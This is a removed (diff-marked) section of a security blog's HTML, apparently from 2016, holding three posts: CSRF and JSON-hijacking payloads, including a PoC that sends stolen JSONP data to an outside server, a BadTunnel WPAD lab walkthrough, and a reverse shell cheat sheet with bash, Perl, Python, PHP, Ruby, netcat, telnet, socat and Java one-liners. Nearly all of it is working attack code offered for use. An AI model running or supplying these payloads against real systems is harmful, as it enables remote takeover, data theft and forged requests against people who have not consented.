-            <h3 id="example-CSRF"><a href="#example-CSRF" class="headerlink" title="example CSRF"></a>example CSRF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://taget.com/modify&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;xl7dev&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;password&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      document.forms[0].submit();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="AJAX-CSRF"><a href="#AJAX-CSRF" class="headerlink" title="AJAX CSRF"></a>AJAX CSRF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function csrfAjax()&#123;</span><br><span class="line">    if (window.XMLHttpRequest)&#123;</span><br><span class="line">        xmlhttp=new XMLHttpRequest();</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.onreadystatechange=function()&#123;</span><br><span class="line">        if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)&#123;</span><br><span class="line">            document.getElementById(&quot;myDiv&quot;).innerHTML=xmlhttp.responseText;         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(&quot;POST&quot;,&quot;http://target.com/csrf.php&quot;,true);</span><br><span class="line">    xmlhttp.setRequestHeader(&quot;X-Requested-With&quot;, &quot;XMLHttpRequest&quot;);</span><br><span class="line">    xmlhttp.send(&quot;query=123hacked123&amp;primary            Type=mixed&amp;sortBy=date&amp;intl=true&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="Bypass-Header-via-Flash"><a href="#Bypass-Header-via-Flash" class="headerlink" title="Bypass Header via Flash"></a>Bypass Header via Flash</h3><blockquote>
-<p>crossdomain.xml</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;cross-domain-policy&gt;</span><br><span class="line">&lt;allow-access-from domain=&quot;*&quot;/&gt;</span><br><span class="line">&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>flashcsrfexp.as</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class forge_headers&#123;</span><br><span class="line">    function forge_headers()&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    static function main(mc)&#123;</span><br><span class="line">        var req:LoadVars=new LoadVars();</span><br><span class="line">        // GET method</span><br><span class="line">        //req.addRequestHeader(&quot;Foo&quot;,&quot;Bar&quot;);</span><br><span class="line">        //req.addRequestHeader(&quot;Host:&quot;,&quot;www.target.com&quot;);</span><br><span class="line">        //req.send(&quot;http://www.target.com/csrf.php?p1=v1&amp;p2=v2&quot;,&quot;&quot;,&quot;GET&quot;);</span><br><span class="line">        //req.send(&quot;http://www.target.com/csrf.php&quot;,&quot;&quot;,&quot;GET&quot;)</span><br><span class="line">        // POST method</span><br><span class="line">        req.addRequestHeader(&quot;Bar&quot;,&quot;BarFoo&quot;);</span><br><span class="line">        req.addRequestHeader(&quot;Referer:http://www.target.com/csrf.php&quot;,&quot;&quot;)</span><br><span class="line">        req.addRequestHeader(&quot;Host:&quot;,&quot;www.target.com&quot;);</span><br><span class="line">        req.decode(&quot;username=xl7dev&amp;password=pass&quot;);</span><br><span class="line">        req.send(&quot;http://www.target.com/csrf.php&quot;,&quot;&quot;,&quot;POST&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Usage：url=[post请求的地址]&amp;[参数值用&amp;分开]</p>
-</blockquote>
-<p>FlashCSRFexp.swf?url=<a href="http://www.xx.xx/x.jsp?&amp;xx=xx&amp;xx=xx&amp;xx=xx&amp;xx=xx" target="_blank" rel="external">http://www.xx.xx/x.jsp?&amp;xx=xx&amp;xx=xx&amp;xx=xx&amp;xx=xx</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">   import flash.display.Sprite;</span><br><span class="line">   import flash.net.URLRequest;</span><br><span class="line">   import flash.net.URLRequestMethod;</span><br><span class="line">   import flash.net.sendToURL;</span><br><span class="line">   </span><br><span class="line">   public class FlashCSRFexp extends Sprite</span><br><span class="line">   &#123;</span><br><span class="line">       </span><br><span class="line">      public function FlashCSRFexp()</span><br><span class="line">      &#123;</span><br><span class="line">         var key:* = null;</span><br><span class="line">         var emailtargetURL:String = null;</span><br><span class="line">         var emailrequest:URLRequest = null;</span><br><span class="line">         var datastring:String = null;</span><br><span class="line">         super();</span><br><span class="line">         var postdata:Object = this.loaderInfo.parameters;</span><br><span class="line">         var data:Array = [];</span><br><span class="line">         for(key in postdata)</span><br><span class="line">         &#123;</span><br><span class="line">            if(key != &quot;url&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">               data.push(key + &quot;=&quot; + postdata[key]);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         emailtargetURL = postdata.url;</span><br><span class="line">         emailrequest = new URLRequest(emailtargetURL);</span><br><span class="line">         emailrequest.method = URLRequestMethod.POST;</span><br><span class="line">         datastring = data.join(&quot;&amp;&quot;);</span><br><span class="line">         emailrequest.data = datastring;</span><br><span class="line">         sendToURL(emailrequest);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="JSON-HiJacking"><a href="#JSON-HiJacking" class="headerlink" title="JSON HiJacking"></a>JSON HiJacking</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot; /&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt; </span><br><span class="line">    function jsonpCallback(result) &#123; </span><br><span class="line">        alert(result.a); </span><br><span class="line">        alert(result.b);</span><br><span class="line">        alert(result.c); </span><br><span class="line">        for(var i in result) &#123; </span><br><span class="line">            alert(i+&quot;:&quot;+result[i]);//循环输出a:1,b:2,etc. </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&lt;/script&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.target.com/json.php?callback=jsonpCallback&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>POC</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot; /&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt; </span><br><span class="line">    function hijack(result) &#123; </span><br><span class="line">        var data = &apos;&apos;;</span><br><span class="line">        for(var i in result) &#123;</span><br><span class="line">            data += i + &apos;:&apos; + result[i];</span><br><span class="line">        &#125;</span><br><span class="line">        new Image().src = &quot;http://blog.safebuff.com/JSONHiJacking.php?data=&quot; + escape(data);//把数据发送到攻击者服务器上</span><br><span class="line">    &#125; </span><br><span class="line">&lt;/script&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.target.com/services.php?callback=hijack&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="CSRF-via-XSS"><a href="#CSRF-via-XSS" class="headerlink" title="CSRF via XSS"></a>CSRF via XSS</h3><p><a href="http://blog.safebuff.com/2016/05/26/Bypass-CSRF-Protection-via-XSS/">CSRF via XSS</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-BadTunnel " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/06/22/BadTunnel-Vulnerability/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/06/22/BadTunnel-Vulnerability/" itemprop="url">
-                  BadTunnel Vulnerability
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-22T15:25:29+08:00">
-                2016-06-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="Test-Environment"><a href="#Test-Environment" class="headerlink" title="Test Environment"></a>Test Environment</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Kali    10.0.5.9</span><br><span class="line">Windows2003     10.0.5.100</span><br></pre></td></tr></table></figure>
-<h4 id="Download-EXP"><a href="#Download-EXP" class="headerlink" title="Download EXP"></a>Download EXP</h4><p><a href="https://github.com/T3rry7f/BadTunnel_exp" target="_blank" rel="external">BadTunnel</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; git clone https://github.com/T3rry7f/BadTunnel_exp    #save to www filepath</span><br></pre></td></tr></table></figure></p>
-<p><a href="https://raw.githubusercontent.com/Anorov/PySocks/master/test/httpproxy.py" target="_blank" rel="external">HttpProxy</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget https://raw.githubusercontent.com/Anorov/PySocks/master/test/httpproxy.py  #edit app.listen(port, address=&quot;0.0.0.0&quot;)</span><br></pre></td></tr></table></figure></p>
-<h4 id="Step"><a href="#Step" class="headerlink" title="Step"></a>Step</h4><blockquote>
-<p>vi wpad.dat</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function FindProxyForURL(url, host) &#123;</span><br><span class="line">      // URLs within this network are accessed directly</span><br><span class="line">      if (isInNet(host, &quot;127.0.0.1&quot;, &quot;255.255.255.0&quot;))</span><br><span class="line">      &#123;</span><br><span class="line">         return &quot;DIRECT&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      return &quot;PROXY 10.0.5.9:8081; DIRECT&quot;;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>vi badtunnel_test.html</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;\\10.0.5.9\BadTunnel&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;http://WPAD/wpad.dat&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; python httpproxy.py</span><br><span class="line">&gt; python badtunnel.py 10.0.5.9</span><br></pre></td></tr></table></figure>
-<p>settings ie proxy “Automatic check setting”,then<br>Using ie browser open site <a href="http://10.0.5.9/badtunnel_test.html" target="_blank" rel="external">http://10.0.5.9/badtunnel_test.html</a></p>
-<p>Windows dos views<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt; nbtstat -c</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">本地连接:</span><br><span class="line">Node IpAddress: [10.0.5.100] Scope Id: []</span><br><span class="line"></span><br><span class="line">                  NetBIOS Remote Cache Name Table</span><br><span class="line"></span><br><span class="line">        Name              Type       Host Address    Life [sec]</span><br><span class="line">    ------------------------------------------------------------</span><br><span class="line">    WPAD           &lt;00&gt;  UNIQUE          10.0.5.9            352</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/06/19/Reverse-shell-Cheat-Sheet/" itemprop="url">
-                  Reverse shell Cheat Sheet
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-19T02:00:20+08:00">
-                2016-06-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -l -vv -p &lt;PORT&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">&gt; exec 5&lt;&gt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt;;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br><span class="line"></span><br><span class="line">&gt; exec /bin/sh 0&lt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 1&gt;&amp;0 2&gt;&amp;0 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt;; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
-<h3 id="TCLsh"><a href="#TCLsh" class="headerlink" title="TCLsh"></a>TCLsh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/tclsh</span><br><span class="line">set s [socket &lt;IP&gt; &lt;PORT&gt;];</span><br><span class="line">while &#123;42&#125; &#123;</span><br><span class="line">puts -nonewline $s &quot;shell&gt;&quot;;</span><br><span class="line">flush $s;</span><br><span class="line">gets $s c;</span><br><span class="line">set e &quot;exec $c&quot;;</span><br><span class="line">if &#123;![catch &#123;set r [eval $e]&#125; err]&#125; &#123;</span><br><span class="line">puts $s $r;</span><br><span class="line">&#125;</span><br><span class="line">flush $s;</span><br><span class="line">&#125;</span><br><span class="line">close $s;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; echo &apos;set s [socket &lt;IP&gt; &lt;PORT&gt;];while 42 &#123; puts -nonewline $s &quot;shell&gt;&quot;;flush $s;gets $s c;set e &quot;exec $c&quot;;if &#123;![catch &#123;set r [eval $e]&#125; err]&#125; &#123; puts $s $r &#125;; flush $s; &#125;; close $s;&apos; | tclsh</span><br></pre></td></tr></table></figure>
-<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; perl -e &apos;use Socket;$i=&quot;&lt;IP&gt;&quot;;$p=&lt;PORT&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br><span class="line">&gt; perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;&lt;IP&gt;:&lt;PORT&gt;&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</span><br><span class="line">&gt; perl -MIO -e &quot;$c=new IO::Socket::INET(PeerAddr,&apos;&lt;IP&gt;:&lt;PORT&gt;&apos;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
-<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; php -r &apos;$s=fsockopen(&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br><span class="line">&gt; php -r &apos;$s=fsockopen(&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br><span class="line">&gt; php -r &apos;$s=fsockopen(&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&apos;</span><br><span class="line">&gt; php -r &apos;$s=fsockopen(&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br><span class="line">&gt; php -r &apos;$s=fsockopen(&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&apos;</span><br></pre></td></tr></table></figure>
-<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; ruby -rsocket -e&apos;f=TCPSocket.open(&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br><span class="line">&gt; ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;&lt;IP&gt;&quot;,&quot;&lt;PORT&gt;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</span><br><span class="line">&gt; ruby -rsocket -e &quot;c=TCPSocket.new(&apos;&lt;IP&gt;&apos;,&apos;&lt;PORT&gt;&apos;);while(cmd=c.gets);IO.popen(cmd,&apos;r&apos;)&#123;|io|c.print io.read&#125;end&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;IP&gt; &lt;PORT&gt; -e /bin/bash</span><br><span class="line">/bin/nc.traditional &lt;IP&gt; &lt;PORT&gt; -e /bin/bash</span><br><span class="line">/bin/nc.traditional &lt;IP&gt; &lt;PORT&gt; -c /bin/bash</span><br></pre></td></tr></table></figure>
-<p>via mkfifo<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt; f</span><br><span class="line">&gt; rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|/bin/nc.openbsd &lt;IP&gt; &lt;PORT&gt; &gt; f</span><br></pre></td></tr></table></figure></p>
-<p>via mknod<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; rm -f x; mknod x p &amp;&amp; nc &lt;IP&gt; &lt;PORT&gt; 0&lt;x | /bin/bash 1&gt;x</span><br><span class="line">&gt; rm -f x; mknod x p &amp;&amp; /bin/nc.openbsd &lt;IP&gt; &lt;PORT&gt; 0&lt;x | /bin/bash 1&gt;x</span><br></pre></td></tr></table></figure></p>
-<h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><blockquote>
-<p>本地监听</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -lvvp port1</span><br><span class="line">&gt; nc -lvvp port2</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>服务器执行</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; telnet &lt;IP&gt; &lt;PORT1&gt; | /bin/bash | telnet &lt;IP&gt; &lt;PORT2&gt;</span><br></pre></td></tr></table></figure>
-<p>via mkfifo<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|telnet &lt;IP&gt; &lt;PORT&gt; &gt; f</span><br></pre></td></tr></table></figure></p>
-<p>via mknod<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f x; mknod x p &amp;&amp; telnet &lt;IP&gt; &lt;PORT&gt; 0&lt;x | /bin/bash 1&gt;x</span><br></pre></td></tr></table></figure></p>
-<h3 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; socat tcp-connect:&lt;IP&gt;:&lt;PORT&gt; exec:&quot;bash -li&quot;,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>
-<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt;;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
